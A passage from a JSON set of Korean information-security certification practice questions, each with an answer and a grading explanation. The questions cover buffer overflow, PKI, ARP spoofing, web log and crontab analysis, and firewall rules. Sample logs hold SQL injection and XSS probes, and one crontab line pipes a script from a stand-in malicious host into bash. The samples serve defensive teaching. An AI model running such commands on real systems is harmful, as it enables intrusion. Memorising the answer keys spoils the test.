상태)**이 발생하기도 한다.\n\n**(2) 대응방안**\n- 세션 구간 **암호화(SSL/TLS, SSH)** 적용 — 시퀀스 넘버·데이터 스니핑 방지\n- **세션 ID(토큰)의 지속적 재발급** 및 세션 타임아웃 설정\n- 웹의 경우 쿠키에 **HttpOnly·Secure** 속성 적용, 재인증 요구\n- 지속적인 ACK Storm·비정상 트래픽 탐지(IDS)","explanation":"세션 하이재킹은 시퀀스 넘버 추측·조작으로 세션을 탈취하는 원리와 ACK Storm 현상, 대응(암호화·세션ID 재발급·HttpOnly)이 핵심이다. TCP 계층(시퀀스 넘버)과 웹 계층(세션 쿠키) 두 관점을 함께 서술하면 좋다."},{"num":14,"type":"서술형","points":12,"domain":"시스템 보안","question":"버퍼 오버플로우(Buffer Overflow) 공격에 대하여 다음 물음에 답하시오.\n\n(1) 버퍼 오버플로우 공격의 개념과 발생 원리를 서술하시오. (6점)\n(2) 버퍼 오버플로우에 대한 대응방안(개발 단계 및 운영체제 차원)을 3가지 이상 서술하시오. (6점)","scenario":"","answer":"**(1) 개념 및 원리**\n- 개념 : 프로그램이 할당된 **버퍼(메모리 공간)의 크기를 초과하는 데이터를 입력**받아, 인접한 메모리 영역을 침범(덮어쓰기)하는 취약점을 악용하는 공격이다.\n- 원리 : 스택 버퍼 오버플로우의 경우, 입력값으로 **복귀 주소(Return Address)를 공격자의 악성 코드(셸코드) 주소로 덮어써서**, 함수 종료 시 악성 코드가 실행되도록 한다. `strcpy`, `gets` 등 경계 검사를 하지 않는 함수가 원인이 된다.\n\n**(2) 대응방안**\n- **개발 단계** : 경계 검사를 하는 안전한 함수 사용(`strncpy`, `fgets`), 입력값 길이 검증\n- **운영체제 차원** :\n  - **스택 카나리(Stack Canary)** : 복귀 주소 앞에 카나리 값을 두어 변조 탐지\n  - **DEP/NX bit** : 데이터 영역(스택)에서 코드 실행 방지\n  - **ASLR** : 메모리 주소를 무작위 배치하여 셸코드 주소 예측 방해","explanation":"버퍼 오버플로우는 복귀 주소를 셸코드 주소로 덮어쓰는 원리와, 대응 3종 세트(스택 카나리, DEP/NX, ASLR)가 핵심이다. 개발 차원(안전한 함수)과 OS 차원(카나리/DEP/ASLR)을 구분해 서술하면 고득점이다. 취약 함수(strcpy, gets) 언급도 채점 요소다."},{"num":15,"type":"서술형","points":12,"domain":"정보보안 일반","question":"공개키 기반구조(PKI)에 대하여 다음 물음에 답하시오.\n\n(1) PKI의 개념을 서술하시오. (4점)\n(2) PKI의 주요 구성요소 중 CA와 RA의 역할을 각각 서술하시오. (4점)\n(3) 인증서 폐지를 관리하는 방법 2가지(CRL, OCSP)를 설명하시오. (4점)","scenario":"","answer":"**(1) 개념**\n- 공개키 암호 방식에서 **공개키의 소유자를 신뢰할 수 있도록 보증**하기 위해, 인증서를 발급·관리하는 체계이다. 전자서명·암호화의 신뢰 기반을 제공한다.\n\n**(2) CA와 RA**\n- **CA(인증기관, Certificate Authority)** : 공개키에 대한 **인증서를 발급·폐지**하고 전자서명하는 최상위 신뢰 기관이다.\n- **RA(등록기관, Registration Authority)** : 사용자의 **신원을 확인·등록**하여 CA에 인증서 발급을 요청하는 대행 기관이다(신원 확인 위임).\n\n**(3) 인증서 폐지 관리**\n- **CRL(인증서 폐지 목록)** : 폐지된 인증서의 일련번호 목록을 주기적으로 배포한다. 구현이 단순하나 실시간성이 떨어진다.\n- **OCSP(온라인 인증서 상태 프로토콜)** : 특정 인증서의 유효 여부를 **실시간으로 질의·응답**한다. 실시간성이 우수하나 서버 부하가 있다.","explanation":"PKI 서술형은 CA(발급)·RA(신원확인)의 역할 구분과 폐지 관리(CRL=목록/주기적, OCSP=실시간)가 핵심이다. X.509 인증서 구조(주체 공개키+CA 서명)를 덧붙이면 좋다. CA가 최상위 신뢰 기관이라는 점을 명확히 해야 한다."},{"num":16,"type":"서술형","points":12,"domain":"정보보안 관리 및 법규","question":"개인정보의 안전성 확보조치에 대하여 다음 물음에 답하시오.\n\n(1) 개인정보처리자가 수립해야 하는 '내부 관리계획'에 포함될 내용을 3가지 이상 서술하시오. (6점)\n(2) 개인정보를 저장·전송할 때의 **암호화 조치** 대상과 방법을 서술하시오. (6점)","scenario":"","answer":"**(1) 내부 관리계획 포함 내용**\n- 개인정보 보호책임자(CPO)의 지정에 관한 사항\n- 개인정보 취급자에 대한 **교육 계획**\n- **접근 권한의 관리**(부여·변경·말소) 및 접근 통제에 관한 사항\n- 개인정보의 **암호화** 조치, 접속기록 보관·점검에 관한 사항\n- 악성프로그램 방지, 물리적 안전조치 등에 관한 사항\n\n**(2) 암호화 조치**\n- **대상** : 비밀번호, 바이오정보(생체정보), 주민등록번호, 여권·운전면허·외국인등록번호, 신용카드번호, 계좌번호 등\n- **방법** :\n  - **비밀번호**는 복호화되지 않도록 **일방향(해시) 암호화**하여 저장한다.\n  - 그 외 고유식별정보·금융정보 등은 **안전한 암호 알고리즘으로 저장**하고, 정보통신망을 통해 **전송 시에도 암호화**한다.","explanation":"안전성 확보조치 서술형은 내부 관리계획 항목과 암호화 대상·방법이 핵심이다. 특히 **비밀번호=일방향(해시) 암호화**, 주민번호·바이오정보·카드번호 등은 저장·전송 암호화라는 점을 정확히 구분해야 한다. 접근권한 기록 3년 보관, 접속기록 보관 등 수치도 함께 알아두면 좋다."},{"num":17,"type":"실무형","points":16,"domain":"애플리케이션·웹 보안 (웹로그 분석)","question":"아래는 웹 서버 로그의 일부이다. 이를 분석하여 물음에 답하시오.","scenario":"```\n203.0.113.7 - - [12/Aug/2026:09:14:22] \"GET /view.php?id=1' HTTP/1.1\" 500 621\n203.0.113.7 - - [12/Aug/2026:09:14:40] \"GET /view.php?id=1 and 1=1 HTTP/1.1\" 200 1820\n203.0.113.7 - - [12/Aug/2026:09:15:05] \"GET /search.php?q=<script>alert(1)<\/script> HTTP/1.1\" 200 940\n```\n\n(1) 위 로그에서 확인되는 **공격 유형 2가지**를 각 요청과 연결하여 쓰시오. (6점)\n(2) 첫 번째 요청의 응답 코드가 **500**인 것이 공격자에게 어떤 의미인지 **판단 근거**를 서술하시오. (4점)\n(3) 각 공격에 대한 **대응방안**을 서술하시오. (6점)","answer":"**(1) 공격 유형 식별**\n- 첫 번째·두 번째 요청 : `id=1'`, `id=1 and 1=1` → **SQL 인젝션**(에러 유발·참거짓 판별로 취약점 탐색, Blind SQL Injection 시도)\n- 세 번째 요청 : `<script>alert(1)<\/script>` → **XSS(크로스 사이트 스크립팅)** 시도\n\n**(2) 판단 근거**\n- `id=1'`에 대해 **500(서버 오류)** 응답이 반환된 것은, 입력한 작은따옴표가 SQL 구문 오류를 일으켰음을 의미한다. 즉 입력값이 **검증 없이 쿼리에 삽입**되고 있어 SQL 인젝션에 취약함을 나타낸다.\n\n**(3) 대응방안**\n- SQL 인젝션 : **매개변수화 쿼리(Prepared Statement)** 사용, 특수문자 필터링, **상세 에러 메시지 노출 차단**(500 대신 일반 오류 페이지)\n- XSS : 출력 시 **HTML 인코딩(이스케이프)**, 입력값 검증, CSP 헤더 적용\n- 공통 : WAF 도입, DB 계정 최소 권한","explanation":"웹로그에서 `'`(따옴표)+500 오류는 SQL 인젝션 취약의 강력한 신호다. `<script>`는 XSS 시도. 500 오류가 왜 위험한지(에러 기반 정보 노출·입력 미검증)를 근거로 설명하는 것이 채점 포인트다. 대응은 Prepared Statement(SQLi)와 출력 인코딩(XSS)을 명확히 구분해야 한다."},{"num":18,"type":"실무형","points":16,"domain":"시스템 보안 (리눅스 보안 설정)","question":"아래는 리눅스 서버의 crontab 설정 내용이다. 이를 분석하여 물음에 답하시오.","scenario":"```\n# crontab -l 결과\n0 3 * * * /usr/local/bin/backup.sh\n*/5 * * * * curl http://malicious.example/x.sh | bash\n30 4 * * 0 /usr/bin/logrotate /etc/logrotate.conf\n```\n\n(1) 위 설정에서 **보안상 의심스러운 항목**을 찾고, 그 이유를 서술하시오. (6점)\n(2) 의심 항목의 시간 설정(`*/5 * * * *`)이 의미하는 **실행 주기**를 쓰고, 크론탭 5개 필드의 순서를 서술하시오. (4점)\n(3) 발견된 문제에 대한 **조치 방안**을 서술하시오. (6점)","answer":"**(1) 의심스러운 항목과 이유**\n- `*/5 * * * * curl http://malicious.example/x.sh | bash` 항목이 의심스럽다.\n- 이유 : **5분마다** 외부의 알 수 없는 서버(`malicious.example`)에서 스크립트를 내려받아 **즉시 실행(bash)**한다. 이는 지속성(persistence)을 확보하려는 **백도어/악성코드의 전형적 형태**이다.\n\n**(2) 크론탭 필드 의미**\n- `*/5 * * * *` : (분/시/일/월/요일) → **매 5분마다** 실행\n- 필드 순서 : 분(0-59) 시(0-23) 일(1-31) 월(1-12) 요일(0-7)\n\n**(3) 조치 방안**\n- 해당 크론 작업 **즉시 삭제**(`crontab -e` 또는 `/etc/crontab`, `/etc/cron.d/` 점검)\n- 다운로드·실행된 **악성 스크립트 파일 탐색 및 제거**, 생성된 프로세스·계정 조사\n- **cron.allow/cron.deny**로 크론 사용자 제한, 아웃바운드 연결(방화벽) 통제\n- 침해 범위 조사 및 무결성 점검(변조 파일 확인), 로그 분석","explanation":"cron 백도어 실무형의 핵심은 '외부 URL에서 스크립트를 받아 실행하는 주기적 작업 = 악성코드 지속성'이라는 판단이다. 크론탭 필드 순서(분 시 일 월 요일)와 `*/5`(5분마다) 해석, 조치(삭제·악성파일 제거·cron.allow 제한)가 채점 포인트다."}]},{"round":4,"title":"제4회 예상문제","questions":[{"num":1,"type":"단답형","points":3,"domain":"시스템 보안","question":"다음 설명에 해당하는 리눅스 파일시스템 구성 요소를 쓰시오.\n\n리눅스 파일시스템에서 각 파일·디렉터리의 **메타데이터(소유자, 권한, 크기, 타임스탬프, 데이터 블록 위치 등)**를 저장하는 자료구조로, 파일명은 저장하지 않는다. 이 값이 고갈되면 디스크 용량이 남아도 파일을 생성할 수 없다.","scenario":"","answer":"i-node (아이노드)","explanation":"i-node는 파일명을 제외한 모든 메타데이터를 담는다(파일명은 디렉터리 엔트리에 저장). `ls -i`로 i-node 번호를 확인하고, `df -i`로 i-node 사용량을 본다. 여러 파일명이 하나의 i-node를 가리키는 것이 하드링크다."},{"num":2,"type":"단답형","points":3,"domain":"시스템 보안","question":"다음은 syslog 설정에 대한 설명이다. (①), (②)에 들어갈 용어를 쓰시오.\n\nsyslog는 로그 메시지를 `[facility].[priority]` 형식으로 분류한다. 여기서 ( ① )은(는) 로그를 발생시킨 **서비스·기능의 종류**(예: auth, cron, mail)를 나타내고, ( ② )은(는) 로그의 **심각도**(예: emerg, err, info)를 나타낸다.","scenario":"","answer":"① facility (퍼실리티, 서비스 분류)\n② priority (severity, 심각도/우선순위)","explanation":"syslog는 facility(발생원)와 priority(심각도)로 로그를 분류하여 저장 위치를 결정한다. 심각도는 emerg(0) > alert(1) > crit(2) > err(3) > warning(4) > notice(5) > info(6) > debug(7) 순이다. 설정 파일은 `/etc/rsyslog.conf`이다."},{"num":3,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 공격 기법을 쓰시오.\n\n공격자가 IP 패킷을 분할(Fragmentation)할 때 **Fragment Offset 값을 조작하여 조각들이 서로 겹치도록** 만들어 전송한다. 수신 시스템이 이 조각들을 재조합하는 과정에서 오류가 발생하여 시스템이 다운되는 DoS 공격이다.","scenario":"","answer":"티어드롭 (Teardrop Attack)","explanation":"Teardrop은 IP 단편화의 Offset을 겹치게 조작해 재조합 오류를 유발한다. 유사하게 큰 ICMP 패킷을 단편화해 재조합 시 오버플로우를 일으키는 것이 Ping of Death다. 대응은 OS 패치와 비정상 단편 패킷 필터링이다."},{"num":4,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 포트 스캔 기법을 쓰시오.\n\n3-way handshake를 완성하지 않고, SYN 패킷을 보낸 뒤 **SYN+ACK 응답이 오면 곧바로 RST를 보내 연결을 끊는** 방식이다. 연결을 완성하지 않으므로 대상 시스템의 로그에 잘 남지 않아 'Half-Open Scan'이라고도 한다.","scenario":"","answer":"SYN 스캔 (TCP SYN Scan / Half-Open Scan / Stealth Scan)","explanation":"SYN 스캔은 연결을 완성하지 않아(SYN→SYN/ACK→RST) 로그 회피에 유리하다. 포트가 열려 있으면 SYN/ACK, 닫혀 있으면 RST가 온다. 반면 TCP Open(Full) 스캔은 3-way를 완성해 정확하지만 로그에 남는다."},{"num":5,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음은 SSL/TLS 핸드셰이크에 대한 설명이다. 빈칸에 들어갈 용어를 쓰시오.\n\nSSL/TLS 핸드셰이크 과정에서 서버는 자신의 ( ① )을(를) 클라이언트에게 전송하여 신원을 증명한다. 클라이언트는 이를 검증한 후, 대칭 암호화에 사용할 ( ② )을(를) 서버의 공개키로 암호화하여 전달한다.","scenario":"","answer":"① (서버) 인증서 (X.509 Certificate)\n② 세션키 (Pre-master secret / 대칭키)","explanation":"TLS 핸드셰이크는 서버 인증서로 신원을 확인하고, 세션키를 서버 공개키로 안전하게 교환(하이브리드)한 뒤, 이후 통신은 빠른 대칭키로 암호화한다. 공개키의 안전한 키 분배 + 대칭키의 속도를 결합한 대표 사례다."},{"num":6,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음 설명에 해당하는 SQL 인젝션 유형을 쓰시오.\n\n쿼리 결과나 에러 메시지가 화면에 직접 표시되지 않는 환경에서, 공격자가 **참/거짓을 유발하는 조건**(예: `and 1=1`, `and 1=2`)이나 **시간 지연**(예: `sleep()`)을 이용해 응답의 차이를 관찰함으로써 데이터를 한 비트씩 추론하는 공격이다.","scenario":"","answer":"블라인드 SQL 인젝션 (Blind SQL Injection)","explanation":"Blind SQLi는 결과가 직접 노출되지 않을 때 참/거짓 응답 차이(Boolean-based)나 응답 지연(Time-based)으로 정보를 추론한다. 느리지만 자동화 도구로 데이터 추출이 가능하다. 대응은 일반 SQLi와 동일하게 Prepared Statement가 핵심이다."},{"num":7,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음 설명에 해당하는 웹 취약점을 쓰시오.\n\n파일 업로드 기능에서 업로드되는 파일의 **확장자·형식을 검증하지 않아**, 공격자가 서버 측 스크립트 파일(jsp, php 등)을 업로드하고 실행하여 시스템을 장악할 수 있는 취약점이다.","scenario":"","answer":"파일 업로드 취약점 (Unrestricted File Upload)","explanation":"파일 업로드 취약점은 웹셸 업로드의 주 통로다. 대응으로는 확장자 **화이트리스트 검증**, 파일 시그니처(매직바이트) 확인, 업로드 디렉터리 **실행 권한 제거**, 업로드 경로와 웹 실행 경로 분리, 파일명 난수화가 있다."},{"num":8,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음 설명에 해당하는 기술을 각각 쓰시오.\n\n- ( ① ) : 데이터를 이미지·음악 등 다른 매체 속에 **은밀히 숨겨** 존재 자체를 감추는 기술이다.\n- ( ② ) : 콘텐츠에 저작권 정보 등을 **삽입**하여, 불법 복제 시 출처를 추적하거나 소유권을 증명하는 기술이다.","scenario":"","answer":"① 스테가노그래피 (Steganography)\n② 디지털 워터마킹 (Digital Watermarking)","explanation":"스테가노그래피는 '존재를 은닉'(비밀 통신), 워터마킹은 '저작권 정보 삽입'(소유권 증명)이 목적이다. 워터마킹 중 추적을 위해 구매자별 고유 정보를 삽입하는 것을 핑거프린팅(Fingerprinting)이라 한다. 암호화가 '내용'을 감춘다면 스테가노그래피는 '존재'를 감춘다."},{"num":9,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음은 방화벽 구축 유형에 대한 설명이다. 빈칸에 들어갈 구성을 쓰시오.\n\n내부 네트워크와 외부 네트워크 사이에 **두 개의 방화벽(스크리닝 라우터)을 두어 그 사이에 완충 지역(DMZ)을 구성**하는 방식으로, 가장 안전한 방화벽 구축 유형으로 평가된다.","scenario":"","answer":"스크린드 서브넷 (Screened Subnet)","explanation":"스크린드 서브넷은 외부/내부 사이에 DMZ(완충 구간)를 두어 이중으로 보호하는 가장 안전한 구성이다. 웹·메일 서버 등 외부 공개 서버는 DMZ에 배치한다. 그 외 구성으로 스크리닝 라우터, 배스천 호스트, 스크린드 호스트가 있다."},{"num":10,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음 설명에 해당하는 접근통제 모델을 쓰시오.\n\n**무결성**을 보장하기 위한 모델로, 주체는 자신보다 **낮은 등급의 객체를 읽을 수 없고(No Read Down), 높은 등급의 객체에 쓸 수 없다(No Write Up)**는 규칙을 갖는다. BLP 모델과 대비된다.","scenario":"","answer":"비바 모델 (Biba Model)","explanation":"Biba는 무결성 중심 모델로 No Read Down(하위 읽기 금지=오염 방지), No Write Up(상위 쓰기 금지) 규칙을 갖는다. 기밀성 중심의 BLP(No Read Up, No Write Down)와 정확히 반대 방향이다. 무결성 모델에는 Clark-Wilson(잘 구성된 트랜잭션·직무분리)도 있다."},{"num":11,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"개인정보보호법상 다음 설명에 해당하는 정보를 쓰시오.\n\n개인정보의 일부를 삭제하거나 일부 또는 전부를 대체하는 등의 방법으로 **추가 정보 없이는 특정 개인을 알아볼 수 없도록 처리**한 정보로, 통계작성·과학적 연구·공익적 기록보존 등의 목적으로는 정보주체의 동의 없이 처리할 수 있다.","scenario":"","answer":"가명정보","explanation":"가명정보는 '추가 정보 없이는 특정 개인을 알아볼 수 없게' 가명처리한 정보로, 정보주체 동의 없이 통계·과학연구·공익적 기록보존에 활용 가능하다. 추가 정보와 결합하면 재식별될 수 있어 분리 보관·안전조치가 요구된다. 반면 익명정보는 재식별이 불가능하여 개인정보보호법 적용 대상이 아니다."},{"num":12,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"다음 설명에 해당하는 인증제도를 쓰시오.\n\n정보통신망법에 근거하여, 정보통신서비스 제공자 등이 정보보호를 위한 관리적·기술적·물리적 보호조치를 갖추었는지 심사하여 인증을 부여하는 제도이다. 일정 요건(예: 정보통신서비스 매출 100억 이상, 일평균 이용자 100만 명 이상 등)을 충족하는 사업자는 의무적으로 받아야 한다.","scenario":"","answer":"ISMS (정보보호 관리체계 인증)","explanation":"ISMS 인증 의무 대상은 ISP·IDC 사업자, 정보통신서비스 매출 100억 이상 또는 일평균 이용자 100만 명 이상 등이다. 인증 유효기간은 3년(매년 사후심사, 3년마다 갱신)이다. 개인정보 흐름까지 포함하면 ISMS-P가 된다."},{"num":13,"type":"서술형","points":12,"domain":"네트워크 보안","question":"ARP 스푸핑(ARP Spoofing) 공격에 대하여 다음 물음에 답하시오.\n\n(1) ARP 프로토콜의 어떤 특성 때문에 ARP 스푸핑이 가능한지 서술하시오. (4점)\n(2) ARP 스푸핑의 공격 원리를 서술하시오. (4점)\n(3) ARP 스푸핑에 대한 대응방안을 3가지 서술하시오. (4점)","scenario":"","answer":"**(1) 취약한 특성**\n- ARP는 IP를 MAC 주소로 변환하는 프로토콜인데, **응답(ARP Reply)에 대한 인증 절차가 없다.** 따라서 요청하지 않은 위조된 ARP Reply도 그대로 수신하여 ARP 캐시 테이블에 반영하는 취약점이 있다.\n\n**(2) 공격 원리**\n- 공격자가 피해자에게 \"**게이트웨이의 IP = 공격자의 MAC**\"이라는 위조 ARP Reply를, 게이트웨이에는 \"피해자 IP = 공격자 MAC\"을 지속 전송한다.\n- 그 결과 피해자와 게이트웨이 간 트래픽이 모두 공격자를 경유하게 되어 **스니핑·중간자 공격(MITM)**이 가능해진다.\n\n**(3) 대응방안**\n- 중요 시스템의 **ARP 테이블을 정적(static)으로 등록**하여 위조 Reply를 무시\n- **arpwatch** 등으로 MAC-IP 매핑 변화를 탐지\n- 스위치의 **DAI(Dynamic ARP Inspection)** 기능으로 위조 ARP 차단, 구간 암호화(SSL/TLS)","explanation":"ARP 스푸핑 서술형은 (1)ARP의 무인증 특성 (2)게이트웨이 사칭으로 MITM (3)정적 ARP·arpwatch·DAI 대응이 핵심이다. \"인증 절차가 없다\"는 근본 원인과 정적 ARP 등록이라는 핵심 대응을 반드시 써야 한다."},{"num":14,"type":"서술형","points":12,"domain":"애플리케이션·웹 보안","question":"파일 업로드 취약점에 대하여 다음 물음에 답하시오.\n\n(1) 파일 업로드 취약점이 웹셸(Web Shell) 공격으로 이어지는 과정을 서술하시오. (6점)\n(2) 파일 업로드 취약점에 대한 대응방안을 4가지 이상 서술하시오. (6점)","scenario":"","answer":"**(1) 웹셸 공격으로 이어지는 과정**\n1. 공격자가 게시판·자료실 등의 파일 업로드 기능을 통해 **서버 측 스크립트 파일(웹셸: jsp, php, asp 등)을 업로드**한다.\n2. 서버가 확장자·형식을 검증하지 않아 업로드가 성공한다.\n3. 공격자가 업로드된 웹셸 파일의 **URL에 직접 접근**한다.\n4. 업로드 디렉터리에 실행 권한이 있어 웹셸이 실행되면, 공격자는 **원격에서 시스템 명령을 실행**하고 서버를 장악한다.\n\n**(2) 대응방안**\n- 업로드 파일 **확장자 화이트리스트 검증**(허용 목록만 통과)\n- **파일 시그니처(매직 바이트)** 검사로 위장 확장자 차단\n- 업로드 디렉터리의 **스크립트 실행 권한 제거**(.htaccess 등)\n- **업로드 경로와 웹 실행 경로 분리**, 파일명 난수화\n- 업로드 용량 제한, 웹셸 탐지 도구 정기 점검","explanation":"파일 업로드→웹셸 4단계(업로드→검증실패→URL접근→명령실행)를 순서대로 서술하고, 대응은 화이트리스트·시그니처검사·실행권한제거·경로분리를 개수 채워 쓰는 것이 유리하다. 특히 '업로드 디렉터리 실행 권한 제거'는 핵심 방어다."},{"num":15,"type":"서술형","points":12,"domain":"정보보안 일반","question":"데이터의 무결성 보장 기술에 대하여 다음 물음에 답하시오.\n\n(1) 해시 함수를 이용한 무결성 검증 원리를 서술하시오. (4점)\n(2) 단순 해시값만 전송할 경우의 한계와, 이를 보완하는 **메시지 인증 코드(MAC)**의 개념을 서술하시오. (4점)\n(3) 전자서명이 MAC보다 추가로 제공하는 보안 서비스를 서술하시오. (4점)","scenario":"","answer":"**(1) 해시 기반 무결성 검증**\n- 송신자가 원문의 **해시값(다이제스트)**을 계산해 함께 전송하면, 수신자는 받은 원문을 다시 해시하여 두 값을 비교한다. 값이 다르면 **전송 중 변조**되었음을 알 수 있다.\n\n**(2) 단순 해시의 한계와 MAC**\n- 한계 : 공격자가 원문과 해시값을 **함께 위조**하면 수신자는 변조를 탐지하지 못한다(무결성만 있고 인증이 없음).\n- **MAC(메시지 인증 코드)** : 송·수신자가 공유하는 **비밀키를 함께 사용해 해시(예: HMAC)**를 생성한다. 키를 모르는 공격자는 올바른 MAC을 만들 수 없으므로 **무결성 + (송신자) 인증**을 함께 제공한다.\n\n**(3) 전자서명의 추가 서비스**\n- MAC은 대칭키(공유 비밀키) 기반이라 **부인방지를 제공하지 못한다**(양쪽 모두 키를 가지므로).\n- **전자서명**은 송신자의 **개인키로 서명**하므로, 송신자만이 만들 수 있어 **부인방지(송신 사실 부인 불가)**를 추가로 제공한다.","explanation":"무결성 기술 계층 이해가 핵심: 해시(무결성만)→MAC(무결성+인증, 대칭키)→전자서명(무결성+인증+부인방지, 공개키). 단순 해시의 한계(원문+해시 동시 위조)와 MAC이 비밀키로 이를 보완하는 점, 전자서명만 부인방지를 제공하는 점을 단계적으로 서술해야 한다."},{"num":16,"type":"서술형","points":12,"domain":"정보보안 관리 및 법규","question":"재해복구(Disaster Recovery)에 대하여 다음 물음에 답하시오.\n\n(1) RTO와 RPO의 의미를 각각 서술하시오. (6점)\n(2) 재해복구 시스템의 유형 중 Mirror Site, Hot Site, Warm Site, Cold Site를 **복구 속도가 빠른 순서**로 나열하고, 각각을 간략히 설명하시오. (6점)","scenario":"","answer":"**(1) RTO와 RPO**\n- **RTO(Recovery Time Objective, 목표복구시간)** : 재해 발생 후 시스템을 **정상 복구하기까지 목표로 하는 시간**. 작을수록 빠른 복구가 요구된다.\n- **RPO(Recovery Point Objective, 목표복구시점)** : 재해 시 **허용 가능한 데이터 손실의 시점(양)**. RPO가 0에 가까울수록 손실 없이 복구해야 함을 의미한다.\n\n**(2) 재해복구 시스템 유형 (복구 빠른 순)**\n1. **Mirror Site** : 주센터와 **동일한 시스템을 실시간 이중화**하여 즉시 전환. 복구가 가장 빠르나 비용이 가장 높다.\n2. **Hot Site** : 동일 시스템을 **대기 상태로 유지**하며 데이터를 주기적(실시간·근실시간) 동기화. 수시간 내 복구.\n3. **Warm Site** : 일부 핵심 설비만 갖추고 있어 **수일 내 복구**. 비용·복구속도 절충.\n4. **Cold Site** : 공간·전원 등 **기본 인프라만 준비**, 장비는 재해 시 구축. 비용은 낮으나 복구가 가장 느리다.","explanation":"DR 서술형은 RTO(시간)·RPO(데이터 시점) 구분과 4가지 사이트 유형의 순서(Mirror>Hot>Warm>Cold)가 핵심이다. RTO=복구 목표 시간, RPO=허용 데이터 손실 시점을 혼동하지 말아야 하고, 각 사이트의 복구속도-비용 트레이드오프를 설명하면 고득점이다."},{"num":17,"type":"실무형","points":16,"domain":"네트워크 보안 (방화벽 정책 분석)","question":"아래는 어느 방화벽의 정책(rule) 테이블이다. 이를 분석하여 물음에 답하시오.","scenario":"```\nNo  | Source          | Destination   | Port     | Action\n----+-----------------+---------------+----------+--------\n1   | any             | 10.0.0.5      | 80,443   | Allow\n2   | 192.168.1.0/24  | 10.0.0.5      | 22       | Allow\n3   | any             | any           | any      | Deny\n```\n\n(1) 위 각 규칙(Rule 1~3)이 의미하는 바를 서술하시오. (6점)\n(2) 방화벽이 규칙을 적용하는 **순서상 원칙**을 설명하고, 위 정책이 이를 준수했는지 서술하시오. (4점)\n(3) 위 정책을 보안상 더 강화하기 위한 **권고 사항**을 2가지 이상 서술하시오. (6점)","answer":"**(1) 정책 해석**\n- Rule 1 : 모든 출발지에서 웹 서버(10.0.0.5)의 80·443 포트로의 접근을 **허용**(웹 서비스 공개)\n- Rule 2 : 관리자망(192.168.1.0/24)에서 서버(10.0.0.5)의 22(SSH) 접근을 **허용**\n- Rule 3 : 그 외 모든 트래픽 **차단(Deny All)**\n\n**(2) 문제점 및 개선**\n- Rule 순서 문제 : 방화벽은 규칙을 **위에서부터 순차 적용**하므로, 만약 **Deny All 규칙(Rule 3)이 상단에 위치**하면 이후 허용 규칙이 무의미해진다. 따라서 **구체적인 허용 규칙을 먼저, 포괄적 차단 규칙을 마지막**에 두어야 한다(현재 순서는 올바름).\n- 최소권한 원칙 : SSH를 특정 관리자망으로 제한한 것은 바람직하다. 다만 **any→any 허용 규칙이 없어야** 한다.\n\n**(3) 권고 사항**\n- 마지막에 **명시적 Deny All + 로깅** 규칙을 두어 차단 트래픽을 기록\n- 불필요 포트 최소화(**화이트리스트/최소권한**), 규칙 정기 검토\n- SSH는 특정 IP+키 인증, 관리 접근은 VPN 경유 권장","explanation":"방화벽 정책 실무형은 (1)규칙 해석 (2)순서(Top-down, 구체적 허용→포괄적 차단) (3)최소권한·Deny All·로깅 권고가 핵심이다. 방화벽이 규칙을 위에서부터 순차 적용한다는 점과, 마지막 명시적 Deny All+로깅을 두는 것이 채점 포인트다."},{"num":18,"type":"실무형","points":16,"domain":"시스템 보안 (로그 침해 분석)","question":"아래는 리눅스 서버의 인증 로그(/var/log/secure) 일부이다. 이를 분석하여 물음에 답하시오.","scenario":"```\nAug 13 02:11:05 srv sshd[2841]: Failed password for root from 203.0.113.99 port 51022\nAug 13 02:11:07 srv sshd[2843]: Failed password for root from 203.0.113.99 port 51026\nAug 13 02:11:09 srv sshd[2845]: Failed password for admin from 203.0.113.99 port 51030\nAug 13 02:11:12 srv sshd[2847]: Failed password for test from 203.0.113.99 port 51034\nAug 13 02:11:20 srv sshd[2851]: Accepted password for admin from 203.0.113.99 port 51040\n```\n\n(1) 위 로그에서 확인되는 **공격 유형**을 쓰고, 그 **판단 근거**를 서술하시오. (6점)\n(2) 마지막 로그(`Accepted password for admin`)가 왜 위험한지 서술하시오. (4점)\n(3) 위 공격에 대한 **대응방안**을 3가지 이상 서술하시오. (6점)","answer":"**(1) 공격 유형 및 근거**\n- 유형 : **무차별 대입 공격(Brute Force) / 패스워드 추측 공격** (SSH 대상)\n- 근거 : 동일 출발지 IP(203.0.113.99)에서 **짧은 시간에 다수의 로그인 실패(Failed password)**가 반복되고 있으며, 여러 사용자명(root, admin, test)을 시도하고 있다. 마지막에 **Accepted password로 로그인 성공**이 기록되어 공격이 성공했을 가능성이 있다.\n\n**(2) 위험성**\n- 반복된 실패 끝에 `Accepted password for admin`이 나타났다면, 공격자가 **약한 패스워드를 추측해 계정 탈취에 성공**했음을 의미한다. 이후 권한 상승·백도어 설치로 이어질 수 있다.\n\n**(3) 대응방안**\n- **계정 잠금 정책** : 일정 횟수 로그인 실패 시 계정 잠금(예: pam_tally2/faillock)\n- SSH 보안 강화 : **root 원격 로그인 금지**(PermitRootLogin no), **키 기반 인증**, 포트 변경, 특정 IP만 허용\n- **fail2ban** 등으로 반복 실패 IP 자동 차단, 강력한 패스워드 정책 적용\n- 침해 성공 시 해당 계정 조사·비밀번호 변경·세션 종료·무결성 점검","explanation":"secure 로그의 반복된 'Failed password' + 다수 계정 시도 = 브루트포스의 전형이다. 특히 'Accepted password'가 뒤따르면 탈취 성공 신호로 위험하다. 대응은 계정 잠금(faillock)·키 인증·root 로그인 금지·fail2ban을 구체적으로 제시하는 것이 채점 포인트다."}]},{"round":5,"title":"제5회 예상문제","subtitle":"단답형 12 · 서술형 4 · 실무형 2(택1) · 총 100점 · 180분","questions":[{"num":1,"type":"단답형","points":3,"domain":"시스템 보안","question":"리눅스 `/etc/shadow`의 암호 필드가 다음과 같을 때 물음에 답하시오.\n\n`root:$6$hs3nm0$D2lU8x.../:19000:0:99999:7:::`\n\n(1) `$6`이 의미하는 **해시 함수**를 쓰시오.\n(2) 두 번째 필드(`hs3nm0`)의 명칭과, 이 값이 방어하는 공격을 